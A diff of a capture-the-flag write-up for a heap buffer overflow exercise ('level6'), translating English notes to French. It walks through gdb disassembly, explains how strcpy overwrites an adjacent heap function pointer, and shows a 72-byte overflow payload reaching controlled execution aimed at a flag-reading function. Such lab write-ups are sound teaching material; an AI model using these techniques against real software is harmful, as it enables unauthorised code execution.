@@ -1,6 +1,6 @@
-# Level 6
+# 06 - Heap buffer overflow 2
 
-- We login as user level6:
+- On se connecte en tant que level6:
 ```
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
@@ -46,20 +46,20 @@ End of assembler dump.
 ```
 
 
-- Let's identify most important orders:
+- Voyons les parties les plus importantes du programme:
 ```
    0x08048485 <+9>:     movl   $0x40,(%esp)
    0x0804848c <+16>:    call   0x8048350 <malloc@plt>
    0x08048491 <+21>:    mov    %eax,0x1c(%esp)
 ```
->Allocate a block of memory of 0x40 (64 in decimal) bytes in the heap. Then, store the addresses of the allocated memory blocks in the stack (at `0x1c(%esp)`).
+> Alloue un bloc de mémoire de 0x40 (64 en décimal) octets dans la heap.
 
 ```
    0x08048495 <+25>:    movl   $0x4,(%esp)
    0x0804849c <+32>:    call   0x8048350 <malloc@plt>
    0x080484a1 <+37>:    mov    %eax,0x18(%esp)
 ```
->Allocate a block of memory of 0x4 (4 in decimal) bytes in the heap. Then, store the addresses of the allocated memory blocks in the stack (at `0x18(%esp)`).
+> Alloue un bloc de mémoire de 0x4 (4 en décimal) octets dans la heap.
 
 ```
    0x080484a5 <+41>:    mov    $0x8048468,%edx
@@ -68,7 +68,7 @@ End of assembler dump.
 ```
 >`0x8048468 <m>: 0x83e58955`
 
->Put the address of `<m>` in the second memory zone allocated by malloc (the one with 4 bytes whose address is stored in `0x18(%esp)`).
+>Met l'adresse de `<m>` dans la seconde zone mémoire allouée par malloc.
 
 ```
    0x080484b0 <+52>:    mov    0xc(%ebp),%eax
@@ -80,19 +80,16 @@ End of assembler dump.
    0x080484c2 <+70>:    mov    %eax,(%esp)
    0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
 ```
->Place the address of the first parameter given to the program (located at `0xc(%ebp) + 0x4`) into the `edx` register.
-
->Copy the content of the first parameter given to the program into the first memory area allocated by malloc (the one with 64 bytes, whose address is stored at `0x1c(%esp)`).
+> Copie le contenu du premier paramètre donné au programme dans la première zone mémoire allouée par malloc.
 
 ```
    0x080484ca <+78>:    mov    0x18(%esp),%eax
    0x080484ce <+82>:    mov    (%eax),%eax
    0x080484d0 <+84>:    call   *%eax
 ```
->Attempt to execute the function whose starting address is stored at `0x18(%esp)`.
+> Tente d'exécuter la fonction `<m>`.
 
 
-- Thus, the program attempt to execute the function `<m>`:
 ```
 (gdb) info functions
 All defined functions:
@@ -118,7 +115,7 @@ End of assembler dump.
 ```
 >`0x80485d1: "Nope"`
 
->This function prints "Nope".
+>Cette fonction affiche "Nope".
 
 ```
 (gdb) disas n
@@ -134,17 +131,16 @@ End of assembler dump.
 ```
 >`0x80485b0: "/bin/cat /home/user/level7/.pass"`
 
->This function prints our flag.
+>Cette fonction affiche notre flag.
 
 
-- Instead of the function `<m>`, we would like to execute the function `<n>`.
-Given that the memory area that stores the address of the function to be executed is allocated on the heap just after the memory area that should receive our input, and since `strcpy` copies the entire source into the destination, we only need to know from how many characters the address of this function begins to be rewritten, and write the address of function `<n>` in its place.
+- Nous cherchons donc à éxecuter la fonction `<n>` plutôt que la fonction `<m>`. Étant donné que la zone mémoire qui stocke l'adresse de la fonction à éxecuter est allouée sur la heap juste après la zone mémoire qui devrait recevoir notre input, et que `strcpy` copie l'intégralité de la source dans la destination, il nous suffit de savoir à partir de combien de caractères l'adresse de cette fonction commence à être réécrite, et d'écrire à sa place l'adresse de la fonction `<n>`.
 ```
 (gdb) b*0x080484d0
 ```
 
 ```
-(gdb) r $(python -c "print 'a'*72 + 'BBBBcccc'")
+(gdb) r $(python -c "print 'a'*72 + 'BBBB'")
 ...
 (gdb) x $eax
 0x42424242:      <Address 0x42424242 out of bounds>
